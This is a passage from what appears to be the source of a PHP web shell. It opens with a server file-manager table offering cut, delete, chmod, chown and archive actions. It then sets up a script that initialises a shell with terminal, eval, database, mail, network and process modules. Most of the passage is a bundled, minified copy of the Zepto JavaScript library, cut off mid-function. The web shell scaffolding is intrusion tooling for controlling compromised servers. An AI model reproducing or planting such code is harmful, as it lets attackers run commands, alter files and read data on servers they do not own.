      		<tr data-path="<?= $value[0] ?>">
      			<td>
      				<div class="cBox"></div>
      			</td>
      			<td style="white-space:normal;">
      				<a class="navigate"><?= $value[1] ?></a>
      				<span class="action floatRight">action</span>
      			</td>
      			<td>DIR</td>
      			<td>root:root</td>
      			<td>drwxr-xr-x</td>
      			<td title="1467817225">06-Jul-2016 15:00:25</td>
      		</tr>
      		<?php
      	}
      	?>
      </tbody>
      <tfoot>
        <tr>
          <td>
            <div class="cBoxAll"></div>
          </td>
          <td>
          	<select id="massAction" class="colSpan">
          		<option disabled="" selected="">Action</option> 
          		<option>cut</option> 
          		<option>copy</option> 
          		<option>paste</option> 
          		<option>delete</option> 
          		<option disabled="">------------</option> 
          		<option>chmod</option> 
          		<option>chown</option> 
          		<option>touch</option> 
          		<option disabled="">------------</option> 
          		<option>extract (tar)</option> 
          		<option>extract (tar.gz)</option> 
          		<option>extract (zip)</option> 
          		<option disabled="">------------</option> 
          		<option>compress (tar)</option> 
          		<option>compress (tar.gz)</option> 
          		<option>compress (zip)</option> 
          		<option disabled="">------------</option> 
          	</select>
          </td>
          <td colspan="4"></td>
        </tr>
        <tr>
          <td></td>
          <td colspan="5">9 file(s), 1 Folder(s)<span class="xplSelected"></span></td>
        </tr>
      </tfoot>
    </table>
  </div>
</div>
<script type="text/javascript">
var targeturl = '<?= $_SERVER["REQUEST_URI"] ?>';
var module_to_load = 'explorer,terminal,eval,convert,database,info,mail,network,processes';
var win = false;
var init_shell = true;
var Zepto = function() {
  function G(a) {
    return a == null ? String(a) : z[A.call(a)] || "object"
  }

  function H(a) {
    return G(a) == "function"
  }

  function I(a) {
    return a != null && a == a.window
  }

  function J(a) {
    return a != null && a.nodeType == a.DOCUMENT_NODE
  }

  function K(a) {
    return G(a) == "object"
  }

  function L(a) {
    return K(a) && !I(a) && Object.getPrototypeOf(a) == Object.prototype
  }

  function M(a) {
    return a instanceof Array
  }

  function N(a) {
    return typeof a.length == "number"
  }

  function O(a) {
    return g.call(a, function(a) {
      return a != null
    })
  }

  function P(a) {
    return a.length > 0 ? c.fn.concat.apply([], a) : a
  }

  function Q(a) {
    return a.replace(/::/g, "/").replace(/([A-Z]+)([A-Z][a-z])/g, "$1_$2").replace(/([a-z\d])([A-Z])/g, "$1_$2").replace(/_/g, "-").toLowerCase()
  }

  function R(a) {
    return a in j ? j[a] : j[a] = new RegExp("(^|\\s)" + a + "(\\s|$)")
  }

  function S(a, b) {
    return typeof b == "number" && !k[Q(a)] ? b + "px" : b
  }

  function T(a) {
    var b, c;
    return i[a] || (b = h.createElement(a), h.body.appendChild(b), c = getComputedStyle(b, "").getPropertyValue("display"), b.parentNode.removeChild(b), c == "none" && (c = "block"), i[a] = c), i[a]
  }

  function U(a) {
    return "children" in a ? f.call(a.children) : c.map(a.childNodes, function(a) {
      if (a.nodeType == 1) return a
    })
  }

  function V(c, d, e) {
    for (b in d) e && (L(d[b]) || M(d[b])) ? (L(d[b]) && !L(c[b]) && (c[b] = {}), M(d[b]) && !M(c[b]) && (c[b] = []), V(c[b], d[b], e)) : d[b] !== a && (c[b] = d[b])
  }

  function W(a, b) {
    return b == null ? c(a) : c(a).filter(b)
  }

  function X(a, b, c, d) {
    return H(b) ? b.call(a, c, d) : b
  }

  function Y(a, b, c) {
    c == null ? a.removeAttribute(b) : a.setAttribute(b, c)
  }

  function Z(b, c) {
    var d = b.className,
      e = d && d.baseVal !== a;
    if (c === a) return e ? d.baseVal : d;
    e ? d.baseVal = c : b.className = c
  }

  function $(a) {
    var b;
    try {
      return a ? a == "true" || (a == "false" ? !1 : a == "null" ? null : !/^0/.test(a) && !isNaN(b = Number(a)) ? b : /^[\[\{]/.test(a) ? c.parseJSON(a) : a) : a
    } catch (d) {
      return a
    }
  }

  function _(a, b) {
    b(a);
    for (var c in a.childNodes) _(a.childNodes[c], b)
  }
  var a, b, c, d, e = [],
    f = e.slice,
    g = e.filter,
    h = window.document,
    i = {},
    j = {},
    k = {
      "column-count": 1,
      columns: 1,
      "font-weight": 1,
      "line-height": 1,
      opacity: 1,
      "z-index": 1,
      zoom: 1
    },
    l = /^\s*<(\w+|!)[^>]*>/,
    m = /^<(\w+)\s*\/?>(?:<\/\1>|)$/,
    n = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,
    o = /^(?:body|html)$/i,
    p = /([A-Z])/g,
    q = ["val", "css", "html", "text", "data", "width", "height", "offset"],
    r = ["after", "prepend", "before", "append"],
    s = h.createElement("table"),
    t = h.createElement("tr"),
    u = {
      tr: h.createElement("tbody"),
      tbody: s,
      thead: s,
      tfoot: s,
      td: t,
      th: t,
      "*": h.createElement("div")
    },
    v = /complete|loaded|interactive/,
    w = /^\.([\w-]+)$/,
    x = /^#([\w-]*)$/,
    y = /^[\w-]*$/,
    z = {},
    A = z.toString,
    B = {},
    C, D, E = h.createElement("div"),
    F = {
      tabindex: "tabIndex",
      readonly: "readOnly",
      "for": "htmlFor",
      "class": "className",
      maxlength: "maxLength",
      cellspacing: "cellSpacing",
      cellpadding: "cellPadding",
      rowspan: "rowSpan",
      colspan: "colSpan",
      usemap: "useMap",
      frameborder: "frameBorder",
      contenteditable: "contentEditable"
    };
  return B.matches = function(a, b) {
    if (!b || !a || a.nodeType !== 1) return !1;
    var c = a.webkitMatchesSelector || a.mozMatchesSelector || a.oMatchesSelector || a.matchesSelector;
    if (c) return c.call(a, b);
    var d, e = a.parentNode,
      f = !e;
    return f && (e = E).appendChild(a), d = ~B.qsa(e, b).indexOf(a), f && E.removeChild(a), d
  }, C = function(a) {
    return a.replace(/-+(.)?/g, function(a, b) {
      return b ? b.toUpperCase() : ""
    })
  }, D = function(a) {
    return g.call(a, function(b, c) {
      return a.indexOf(b) == c
    })
  }, B.fragment = function(b, d, e) {
    var g, i, j;
    return m.test(b) && (g = c(h.createElement(RegExp.$1))), g || (b.replace && (b = b.replace(n, "<$1></$2>")), d === a && (d = l.test(b) && RegExp.$1), d in u || (d = "*"), j = u[d], j.innerHTML = "" + b, g = c.each(f.call(j.childNodes), function() {
      j.removeChild(this)
    })), L(e) && (i = c(g), c.each(e, function(a, b) {
      q.indexOf(a) > -1 ? i[a](b) : i.attr(a, b)
    })), g
  }, B.Z = function(a, b) {
    return a = a || [], a.__proto__ = c.fn, a.selector = b || "", a
  }, B.isZ = function(a) {
    return a instanceof B.Z
  }, B.init = function(b, d) {
    var e;
    if (!b) return B.Z();
    if (typeof b == "string") {
      b = b.trim();
      if (b[0] == "<" && l.test(b)) e = B.fragment(b, RegExp.$1, d), b = null;
      else {
        if (d !== a) return c(d).find(b);
        e = B.qsa(h, b)
      }
    } else {
      if (H(b)) return c(h).ready(b);
      if (B.isZ(b)) return b;
      if (M(b)) e = O(b);
      else if (K(b)) e = [b], b = null;
      else if (l.test(b)) e = B.fragment(b.trim(), RegExp.$1, d), b = null;
      else {
        if (d !== a) return c(d).find(b);
        e = B.qsa(h, b)
      }
    }
    return B.Z(e, b)
  }, c = function(a, b) {
    return B.init(a, b)
  }, c.extend = function(a) {
    var b, c = f.call(arguments, 1);
    return typeof a == "boolean" && (b = a, a = c.shift()), c.forEach(function(c) {
      V(a, c, b)
    }), a
  }, B.qsa = function(a, b) {
    var c, d = b[0] == "#",
      e = !d && b[0] == ".",
      g = d || e ? b.slice(1) : b,
      h = y.test(g);
    return J(a) && h && d ? (c = a.getElementById(g)) ? [c] : [] : a.nodeType !== 1 && a.nodeType !== 9 ? [] : f.call(h && !d ? e ? a.getElementsByClassName(g) : a.getElementsByTagName(b) : a.querySelectorAll(b))
  }, c.contains = function(a, b) {
    return a !== b && a.contains(b)
  }, c.type = G, c.isFunction = H, c.isWindow = I, c.isArray = M, c.isPlainObject = L, c.isEmptyObject = function(a) {
    var b;
    for (b in a) return !1;
    return !0
  }, c.inArray = function(a, b, c) {
    return e.indexOf.call(b, a, c)
  }, c.camelCase = C, c.trim = function(a) {
    return a == null ? "" : String.prototype.trim.call(a)
  }, c.uuid = 0, c.support = {}, c.expr = {}, c.map = function(a, b) {
    var c, d = [],
      e, f;
    if (N(a))
      for (e = 0; e < a.length; e++) c = b(a[e], e), c != null && d.push(c);
    else
      for (f in a) c = b(a[f], f), c != null && d.push(c);
    return P(d)
  }, c.each = function(a, b) {
    var c, d;
    if (N(a)) {
      for (c = 0; c < a.length; c++)
        if (b.call(a[c], c, a[c]) === !1) return a
    } else
      for (d in a)
        if (b.call(a[d], d, a[d]) === !1) return a; return a
  }, c.grep = function(a, b) {
    return g.call(a, b)
  }, window.JSON && (c.parseJSON = JSON.parse), c.each("Boolean Number String Function Array Date RegExp Object Error".split(" "), function(a, b) {
    z["[object " + b + "]"] = b.toLowerCase()
  }), c.fn = {
    forEach: e.forEach,
    reduce: e.reduce,
    push: e.push,
    sort: e.sort,
    indexOf: e.indexOf,
    concat: e.concat,
    map: function(a) {
      return c(c.map(this, function(b, c) {
        return a.call(b, c, b)
      }))
    },
    slice: function() {
      return c(f.apply(this, arguments))
    },
    ready: function(a) {
      return v.test(h.readyState) && h.body ? a(c) : h.addEventListener("DOMContentLoaded", function() {
        a(c)
      }, !1), this
    },
    get: function(b) {
      return b === a ? f.call(this) : this[b >= 0 ? b : b + this.length]
    },
    toArray: function() {
      return this.get()
    },
    size: function() {
      return this.length
    },
    remove: function() {
      return this.each(function() {
        this.parentNode != null && this.parentNode.removeChild(this)
      })
    },
    each: function(a) {
      return e.every.call(this, function(b, c) {
        return a.call(b, c, b) !== !1
      }), this
    },
    filter: function(a) {
      return H(a) ? this.not(this.not(a)) : c(g.call(this, function(b) {
        return B.matches(b, a)
      }))
    },
    add: function(a, b) {
      return c(D(this.concat(c(a, b))))
    },
    is: function(a) {
      return this.length > 0 && B.matches(this[0], a)
    },
    not: function(b) {
      var d = [];
      if (H(b) && b.call !== a) this.each(function(a) {
        b.call(this, a) || d.push(this)
      });
      else {
        var e = typeof b == "string" ? this.filter(b) : N(b) && H(b.item) ? f.call(b) : c(b);
        this.forEach(function(a) {
          e.indexOf(a) < 0 && d.push(a)
        })
      }
      return c(d)
    },
    has: function(a) {
      return this.filter(function() {
        return K(a) ? c.contains(this, a) : c(this).find(a).size()
      })
    },
    eq: function(a) {
      return a === -1 ? this.slice(a) : this.slice(a, +a + 1)
    },
    first: function() {
      var a = this[0];
      return a && !K(a) ? a : c(a)
    },
    last: function() {
      var a = this[this.length - 1];
      return a && !K(a) ? a : c(a)
    },
    find: function(a) {
      var b, d = this;
      return typeof a == "object" ? b = c(a).filter(function() {
        var a = this;
        return e.some.call(d, function(b) {
          return c.contains(b, a)
        })
      }) : this.length == 1 ? b = c(B.qsa(this[0], a)) : b = this.map(function() {
        return B.qsa(this, a)
      }), b
    },
    closest: function(a, b) {
      var d = this[0],
        e = !1;
      typeof a == "object" && (e = c(a));
      while (d && !(e ? e.indexOf(d) >= 0 : B.matches(d, a))) d = d !== b && !J(d) && d.parentNode;
      return c(d)
    },
    parents: function(a) {
      var b = [],
        d = this;
      while (d.length > 0) d = c.map(d, function(a) {
        if ((a = a.parentNode) && !J(a) && b.indexOf(a) < 0) return b.push(a), a
      });
      return W(b, a)
    },
    parent: function(a) {
      return W(D(this.pluck("parentNode")), a)
    },
    children: function(a) {
      return W(this.map(function() {
        return U(this)
      }), a)
    },
    contents: function() {
      return this.map(function() {
        return f.call(this.childNodes)
      })
    },
    siblings: function(a) {
      return W(this.map(function(a, b) {
        return g.call(U(b.parentNode), function(a) {
          return a !== b
        })
      }), a)
    },
    empty: function() {
      return this.each(function() {
        this.innerHTML = ""
      })
    },
    pluck: function(a) {
      return c.map(this, function(b) {
        return b[a]
      })
    },
    show: function() {
      return this.each(function() {
        this.style.display == "none" && (this.style.display = ""), getComputedStyle(this, "").getPropertyValue("display") == "none" && (this.style.display = T(this.nodeName))
      })
    },
    replaceWith: function(a) {
      return this.before(a).remove()
    },
    wrap: function(a) {
      var b = H(a);
      if (this[0] && !b) var d = c(a).get(0),
        e = d.parentNode || this.length > 1;
      return this.each(function(f) {
        c(this).wrapAll(b ? a.call(this, f) : e ? d.cloneNode(!0) : d)
      })
    },
    wrapAll: function(a) {
      if (this[0]) {
        c(this[0]).before(a = c(a));
        var b;
        while ((b = a.children()).length) a = b.first();
        c(a).append(this)
      }
      return this
    },
    wrapInner: function(a) {
      var b = H(a);
      return this.each(function(d) {
        var e = c(this),
          f = e.contents(),
          g = b ? a.call(this, d) : a;
        f.length ? f.wrapAll(g) : e.append(g)
      })
    },
    unwrap: function() {
      return this.parent().each(function() {
        c(this).replaceWith(c(this).children())
      }), this
    },
    clone: function() {
      return this.map(function() {
        return this.cloneNode(!0)
      })
    },
    hide: function() {
      return this.css("display", "none")
    },
    toggle: function(b) {
      return this.each(function() {
        var d = c(this);
        (b === a ? d.css("display") == "none" : b) ? d.show(): d.hide()
      })
    },
    prev: function(a) {
      return c(this.pluck("previousElementSibling")).filter(a || "*")
    },
    next: function(a) {
      return c(this.pluck("nextElementSibling")).filter(a || "*")
    },
    html: function(a) {
      return arguments.length === 0 ? this.length > 0 ? this[0].innerHTML : null : this.each(function(b) {
        var d = this.innerHTML;
        c(this).empty().append(X(this, a, b, d))
      })
    },
    text: function(b) {
      return arguments.length === 0 ? this.length > 0 ? this[0].textContent : null : this.each(function() {
        this.textContent = b === a ? "" : "" + b
      })
    },
    attr: function(c, d) {
      var e;
      return typeof c == "string" && d === a ? this.length == 0 || this[0].nodeType !== 1 ? a : c == "value" && this[0].nodeName == "INPUT" ? this.val() : !(e = this[0].getAttribute(c)) && c in this[0] ? this[0][c] : e : this.each(function(a) {
        if (this.nodeType !== 1) return;
        if (K(c))
          for (b in c) Y(this, b, c[b]);
        else Y(this, c, X(this, d, a, this.getAttribute(c)))
      })
    },
    removeAttr: function(a) {
      return this.each(function() {
        this.nodeType === 1 && Y(this, a)
      })
    },
    prop: function(b, c) {
      return b = F[b] || b, c === a ? this[0] && this[0][b] : this.each(function(a) {
        this[b] = X(this, c, a, this[b])
      })
    },
    data: function(b, c) {
      var d = this.attr("data-" + b.replace(p, "-$1").toLowerCase(), c);
      return d !== null ? $(d) : a
    },
    val: function(a) {
      return arguments.length === 0 ? this[0] && (this[0].multiple ? c(this[0]).find("option").filter(function() {
        return this.selected
      }).pluck("value") : this[0].value) : this.each(function(b) {
        this.value = X(this, a, b, this.value)
      })
    },
    offset: function(a) {
      if (a) return this.each(function(b) {
        var d = c(this),
          e = X(this, a, b, d.offset()),
          f = d.offsetParent().offset(),
          g = {
            top: e.top - f.top,
            left: e.left - f.left
          };
        d.css("position") == "static" && (g.position = "relative"), d.css(g)
      });
      if (this.length == 0) return null;
      var b = this[0].getBoundingClientRect();
      return {
        left: b.left + window.pageXOffset,
        top: b.top + window.pageYOffset,
        width: Math.round(b.width),
        height: Math.round(b.height)
      }
    },
    css: function(a, d) {
      if (arguments.length < 2) {
        var e = this[0],
          f = getComputedStyle(e, "");
        if (!e) return;
        if (typeof a == "string") return e.style[C(a)] || f.getPropertyValue(a);
        if (M(a)) {
          var g = {};
          return c.each(M(a) ? a : [a], function(a, b) {
            g[b] = e.style[C(b)] || f.getPropertyValue(b)
          }), g
        }
      }
      var h = "";
      if (G(a) == "string") !d && d !== 0 ? this.each(function() {
        this.style.removeProperty(Q(a))
      }) : h = Q(a) + ":" + S(a, d);
      else
        for (b in a) !a[b] && a[b] !== 0 ? this.each(function() {
          this.style.removeProperty(Q(b))
        }) : h += Q(b) + ":" + S(b, a[b]) + ";";
      return this.each(function() {
        this.style.cssText += ";" + h
      })
    },
    index: function(a) {
      return a ? this.indexOf(c(a)[0]) : this.parent().children().indexOf(this[0])
    },
    hasClass: function(a) {
      return a ? e.some.call(this, function(a) {
        return this.test(Z(a))
      }, R(a)) : !1
    },
    addClass: function(a) {
      return a ? this.each(function(b) {
        d = [];
        var e = Z(this),
          f = X(this, a, b, e);
        f.split(/\s+/g).forEach(function(a) {
          c(this).hasClass(a) || d.push(a)
        }, this), d.length && Z(this, e + (e ? " " : "") + d.join(" "))
      }) : this
    },
    removeClass: function(b) {
      return this.each(function(c) {
        if (b === a) return Z(this, "");
        d = Z(this), X(this, b, c, d).split(/\s+/g).forEach(function(a) {
          d = d.replace(R(a), " ")
        }), Z(this, d.trim())
      })
    },
    toggleClass: function(b, d) {
      return b ? this.each(function(e) {
        var f = c(this),
          g = X(this, b, e, Z(this));
        g.split(/\s+/g).forEach(function(b) {
          (d === a ? !f.hasClass(b) : d) ? f.addClass(b): f.removeClass(b)
        })
      }) : this
    },
    scrollTop: function(b) {
      if (!this.length) return;
      var c = "scrollTop" in this[0];
      return b === a ? c ? this[0].scrollTop : this[0].pageYOffset : this.each(c ? function() {
        this.scrollTop = b
      } : function() {
        this.scrollTo(this.scrollX, b)
      })
    },
    scrollLeft: function(b) {
      if (!this.length) return;
      var c = "scrollLeft" in this[0];
      return b === a ? c ? this[0].scrollLeft : this[0].pageXOffset : this.each(c ? function() {
        this.scrollLeft = b
      } : function() {
        this.scrollTo(b, this.scrollY)
      })
    },
    position: function() {
      if (!this.length) return;
      var a = this[0],
        b = this.offsetParent(),
        d = this.offset(),
        e = o.test(b[0].nodeName) ? {
          top: 0,
          left: 0
        } : b.offset();
      return d.top -= parseFloat(c(a).css("margin-top")) || 0, d.left -= parseFloat(c(a).css("margin-left")) || 0, e.top += parseFloat(c(b[0]).css("border-top-width")) || 0, e.left += parseFloat(c(b[0]).css("border-left-width")) || 0, {
        top: d.top - e.top,
        left: d.left - e.left
      }
    },
    offsetParent: function() {
      return this.map(function() {
        var a = this.offsetParent || h.body;
        while (a && !o.test(a.nodeName) && c(a).css("position") == "static") a = a.offsetParent;
        return a
      })
    }
  }, c.fn.detach = c.fn.remove, ["width", "height"].forEach(function(b) {
    var d = b.replace(/./, function(a) {
      return a[0].toUpperCase()
    });
    c.fn[b] = function(e) {
      var f, g = this[0];
      return e === a ? I(g) ? g["inner" + d] : J(g) ? g.documentElement["scroll" + d] : (f = this.offset()) && f[b] : this.each(function(a) {
        g = c(this), g.css(b, X(this, e, a, g[b]()))
      })
    }
  }), r.forEach(function(a, b) {
    var d = b % 2;
    c.fn[a] = function() {
      var a, e = c.map(arguments, function(b) {
          return a = G(b), a == "object" || a == "array" || b == null ? b : B.fragment(b)
        }),
        f, g = this.length > 1;
      return e.length < 1 ? this : this.each(function(a, h) {
        f = d ? h : h.parentNode, h = b == 0 ? h.nextSibling : b == 1 ? h.firstChild : b == 2 ? h : null, e.forEach(function(a) {
          if (g) a = a.cloneNode(!0);
          else if (!f) return c(a).remove();
          _(f.insertBefore(a, h), function(a) {
            a.nodeName != null && a.nodeName.toUpperCase() === "SCRIPT" && (!a.type || a.type === "text/javascript") && !a.src && window.eval.call(window, a.innerHTML)
          })
        })
      })
    }, c.fn[d ? a + "To" : "insert" + (b ? "Before" : "After")] = function(b) {
      return c(b)[a](this), this
    }
  }), B.Z.prototype = c.fn, B.uniq = D, B.deserializeValue = $, c.zepto = B, c
}();
window.Zepto = Zepto, window.$ === undefined && (window.$ = Zepto),
  function(a) {
    function m(a) {
      return a._zid || (a._zid = c++)
    }

    function n(a, b, c, d) {
      b = o(b);
      if (b.ns) var e = p(b.ns);
      return (h[m(a)] || []).filter(function(a) {
        return a && (!b.e || a.e == b.e) && (!b.ns || e.test(a.ns)) && (!c || m(a.fn) === m(c)) && (!d || a.sel == d)
      })
    }

    function o(a) {
      var b = ("" + a).split(".");
      return {
        e: b[0],
        ns: b.slice(1).sort().join(" ")
      }
    }

    function p(a) {
      return new RegExp("(?:^| )" + a.replace(" ", " .* ?") + "(?: |$)")
    }

    function q(a, b) {
      return a.del && !j && a.e in k || !!b
    }

    function r(a) {
      return l[a] || j && k[a] || a
    }

    function s(b, c, e, f, g, i, j) {
      var k = m(b),
        n = h[k] || (h[k] = []);
      c.split(/\s/).forEach(function(c) {
        if (c == "ready") return a(document).ready(e);
        var h = o(c);
        h.fn = e, h.sel = g, h.e in l && (e = function(b) {
          var c = b.relatedTarget;
          if (!c || c !== this && !a.contains(this, c)) return h.fn.apply(this, arguments)
        }), h.del = i;
        var k = i || e;
        h.proxy = function(a) {
          a = y(a);
          if (a.isImmediatePropagationStopped()) return;
          a.data = f;
          var c = k.apply(b, a._args == d ? [a] : [a].concat(a._args));
          return c === !1 && (a.preventDefault(), a.stopPropagation()), c
        }, h.i = n.length, n.push(h), "addEventListener" in b && b.addEventListener(r(h.e), h.proxy, q(h, j))
      })
    }

    function t(a, b, c, d, e) {
      var f = m(a);
      (b || "").split(/\s/).forEach(function(b) {
        n(a, b, c, d).forEach(function(b) {
          delete h[f][b.i], "removeEventListener" in a && a.removeEventListener(r(b.e), b.proxy, q(b, e))
        })
      })
    }

    function y(b, c) {
      if (c || !b.isDefaultPrevented) {
        c || (c = b), a.each(x, function(a, d) {
          var e = c[a];
          b[a] = function() {
            return this[d] = u, e && e.apply(c, arguments)
          }, b[d] = v
        });
        if (c.defaultPrevented !== d ? c.defaultPrevented : "returnValue" in c ? c.returnValue === !1 : c.getPreventDefault && c.getPreventDefault()) b.isDefaultPrevented = u
      }
      return b
    }

    function z(a) {
      var b, c = {
        originalEvent: a
      };
      for (b in a) !w.test(b) && a[b] !== d && (c[b] = a[b]);
      return y(c, a)
    }
    var b = a.zepto.qsa,
      c = 1,
      d, e = Array.prototype.slice,
      f = a.isFunction,
      g = function(a) {
        return typeof a == "string"
      },
      h = {},
      i = {},
      j = "onfocusin" in window,
      k = {
        focus: "focusin",
        blur: "focusout"
      },
      l = {
        mouseenter: "mouseover",
        mouseleave: "mouseout"
      };
    i.click = i.mousedown = i.mouseup = i.mousemove = "MouseEvents", a.event = {
      add: s,
      remove: t
    }, a.proxy = function(b, c) {
      if (f(b)) {
        var d = function() {
          return b.apply(c, arguments)
        };
        return d._zid = m(b), d
      }
      if (g(c)) return a.proxy(b[c], b);
      throw new TypeError("expected function")
    }, a.fn.bind = function(a, b, c) {
      return this.on(a, b, c)
    }, a.fn.unbind = function(a, b) {
      return this.off(a, b)
    }, a.fn.one = function(a, b, c, d) {
      return this.on(a, b, c, d, 1)
    };
    var u = function() {
        return !0
      },
      v = function() {
        return !1
      },
      w = /^([A-Z]|returnValue$|layer[XY]$)/,
      x = {
        preventDefault: "isDefaultPrevented",
        stopImmediatePropagation: "isImmediatePropagationStopped",
        stopPropagation: "isPropagationStopped"
      };
    a.fn.delegate = function(a, b, c) {
      return this.on(b, a, c)
    }, a.fn.undelegate = function(a, b, c) {
      return this.off(b, a, c)
    }, a.fn.live = function(b, c) {
      return a(document.body).delegate(this.selector, b, c), this
    }, a.fn.die = function(b, c) {
      return a(document.body).undelegate(this.selector, b, c), this
    }, a.fn.on = function(b, c, h, i, j) {
      var k, l, m = this;
      if (b && !g(b)) return a.each(b, function(a, b) {
        m.on(a, c, h, b, j)
      }), m;
      !g(c) && !f(i) && i !== !1 && (i = h, h = c, c = d);
      if (f(h) || h === !1) i = h, h = d;
      return i === !1 && (i = v), m.each(function(d, f) {
        j && (k = function(a) {
          return t(f, a.type, i), i.apply(this, arguments)
        }), c && (l = function(b) {
          var d, g = a(b.target).closest(c, f).get(0);
          if (g && g !== f) return d = a.extend(z(b), {
            currentTarget: g,
            liveFired: f
          }), (k || i).apply(g, [d].concat(e.call(arguments, 1)))
        }), s(f, b, i, h, c, l || k)
      })
    }, a.fn.off = function(b, c, e) {
      var h = this;
      return b && !g(b) ? (a.each(b, function(a, b) {
        h.off(a, c, b)
      }), h) : (!g(c) && !f(e) && e !== !1 && (e = c, c = d), e === !1 && (e = v), h.each(function() {
        t(this, b, e, c)
      }))
    }, a.fn.trigger = function(b, c) {
      return b = g(b) || a.isPlainObject(b) ? a.Event(b) : y(b), b._args = c, this.each(function() {
        "dispatchEvent" in this ? this.dispatchEvent(b) : a(this).triggerHandler(b, c)
      })
    }, a.fn.triggerHandler = function(b, c) {
      var d, e;
      return this.each(function(f, h) {
        d = z(g(b) ? a.Event(b) : b), d._args = c, d.target = h, a.each(n(h, b.type || b), function(a, b) {
          e = b.proxy(d);
          if (d.isImmediatePropagationStopped()) return !1
        })
      }), e
    }, "focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select keydown keypress keyup error".split(" ").forEach(function(b) {
      a.fn[b] = function(a) {
        return a ? this.bind(b, a) : this.trigger(b)
      }
    }), ["focus", "blur"].forEach(function(b) {
      a.fn[b] = function(a) {
        return a ? this.bind(b, a) : this.each(function() {
          try {
            this[b]()
          } catch (a) {}
        }), this
      }
    }), a.Event = function(a, b) {
      g(a) || (b = a, a = b.type);
      var c = document.createEvent(i[a] || "Events"),
        d = !0;
      if (b)
        for (var e in b) e == "bubbles" ? d = !!b[e] : c[e] = b[e];
      return c.initEvent(a, d, !0), y(c)
    }
  }(Zepto),
  function($) {
    function triggerAndReturn(a, b, c) {
      var d = $.Event(b);
      return $(a).trigger(d, c), !d.isDefaultPrevented()
    }

    function triggerGlobal(a, b, c, d) {
      if (a.global) return triggerAndReturn(b || document, c, d)
    }

    function ajaxStart(a) {
      a.global && $.active++ === 0 && triggerGlobal(a, null, "ajaxStart")
    }

    function ajaxStop(a) {
      a.global && !--$.active && triggerGlobal(a, null, "ajaxStop")
    }

    function ajaxBeforeSend(a, b) {
      var c = b.context;
      if (b.beforeSend.call(c, a, b) === !1 || triggerGlobal(b, c, "ajaxBeforeSend", [a, b]) === !1) return !1;
      triggerGlobal(b, c, "ajaxSend", [a, b])
    }

    function ajaxSuccess(a, b, c, d) {
      var e = c.context,
        f = "success";
      c.success.call(e, a, f, b), d && d.resolveWith(e, [a, f, b]), triggerGlobal(c, e, "ajaxSuccess", [b, c, a]), ajaxComplete(f, b, c)
    }

    function ajaxError(a, b, c, d, e) {
      var f = d.context;
      d.error.call(f, c, b, a), e && e.rejectWith(f, [c, b, a]), triggerGlobal(d, f, "ajaxError", [c, d, a || b]), ajaxComplete(b, c, d)
    }

    function ajaxComplete(a, b, c) {
      var d = c.context;
      c.complete.call(d, b, a), triggerGlobal(c, d, "ajaxComplete", [b, c]), ajaxStop(c)
    }

    function empty() {}

    function mimeToDataType(a) {
      return a && (a = a.split(";", 2)[0]), a && (a == htmlType ? "html" : a == jsonType ? "json" : scriptTypeRE.test(a) ? "script" : xmlTypeRE.test(a) && "xml") || "text"
    }

    function appendQuery(a, b) {
      return b == "" ? a : (a + "&" + b).replace(/[&?]{1,2}/, "?")
    }

    function serializeData(a) {
      a.processData && a.data && $.type(a.data) != "string" && (a.data = $.param(a.data, a.traditional)), a.data && (!a.type || a.type.toUpperCase() == "GET") && (a.url = appendQuery(a.url, a.data), a.data = undefined)
    }

    function parseArguments(a, b, c, d) {
      var e = !$.isFunction(b);
      return {
        url: a,
        data: e ? b : undefined,
        success: e ? $.isFunction(c) ? c : undefined : b,
        dataType: e ? d || c : c
      }
    }

    function serialize(a, b, c, d) {
      var e, f = $.isArray(b),
        g = $.isPlainObject(b);
      $.each(b, function(b, h) {
        e = $.type(h), d && (b = c ? d : d + "[" + (g || e == "object" || e == "array" ? b : "") + "]"), !d && f ? a.add(h.name, h.value) : e == "array" || !c && e == "object" ? serialize(a, h, c, b) : a.add(b, h)
      })
    }
    var jsonpID = 0,
      document = window.document,
      key, name, rscript = /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
      scriptTypeRE = /^(?:text|application)\/javascript/i,
      xmlTypeRE = /^(?:text|application)\/xml/i,
      jsonType = "application/json",
      htmlType = "text/html",
      blankRE = /^\s*$/;
    $.active = 0, $.ajaxJSONP = function(a, b) {
      if ("type" in a) {
        var c = a.jsonpCallback,
          d = ($.isFunction(c) ? c() : c) || "jsonp" + ++jsonpID,
          e = document.createElement("script"),
          f = window[d],
          g, h = function(a) {
            $(e).triggerHandler("error", a || "abort")
          },
          i = {
            abort: h
          },
          j;
        return b && b.promise(i), $(e).on("load error", function(c, h) {
          clearTimeout(j), $(e).off().remove(), c.type == "error" || !g ? ajaxError(null, h || "error", i, a, b) : ajaxSuccess(g[0], i, a, b), window[d] = f, g && $.isFunction(f) && f(g[0]), f = g = undefined
        }), ajaxBeforeSend(i, a) === !1 ? (h("abort"), i) : (window[d] = function() {
          g = arguments
        }, e.src = a.url.replace(/=\?/, "=" + d), document.head.appendChild(e), a.timeout > 0 && (j = setTimeout(function() {
          h("timeout")
        }, a.timeout)), i)
      }
      return $.ajax(a)
    }, $.ajaxSettings = {
      type: "GET",
      beforeSend: empty,
      success: empty,
      error: empty,
      complete: empty,
      context: null,
      global: !0,
      xhr: function() {
        return new window.XMLHttpRequest
      },
      accepts: {
        script: "text/javascript, application/javascript, application/x-javascript",
        json: jsonType,
        xml: "application/xml, text/xml",
        html: htmlType,
        text: "text/plain"
      },
      crossDomain: !1,
      timeout: 0,
      processData: !0,
      cache: !0
    }, $.ajax = function(options) {
      var settings = $.extend({}, options || {}),
        deferred = $.Deferred && $.Deferred();
      for (key in $.ajaxSettings) settings[key] === undefined && (settings[key] = $.ajaxSettings[key]);
      ajaxStart(settings), settings.crossDomain || (settings.crossDomain = /^([\w-]+:)?\/\/([^\/]+)/.test(settings.url) && RegExp.$2 != window.location.host), settings.url || (settings.url = window.location.toString()), serializeData(settings), settings.cache === !1 && (settings.url = appendQuery(settings.url, "_=" + Date.now()));
      var dataType = settings.dataType,
        hasPlaceholder = /=\?/.test(settings.url);
      if (dataType == "jsonp" || hasPlaceholder) return hasPlaceholder || (settings.url = appendQuery(settings.url, settings.jsonp ? settings.jsonp + "=?" : settings.jsonp === !1 ? "" : "callback=?")), $.ajaxJSONP(settings, deferred);
      var mime = settings.accepts[dataType],
        headers = {},
        setHeader = function(a, b) {
          headers[a.toLowerCase()] = [a, b]
        },
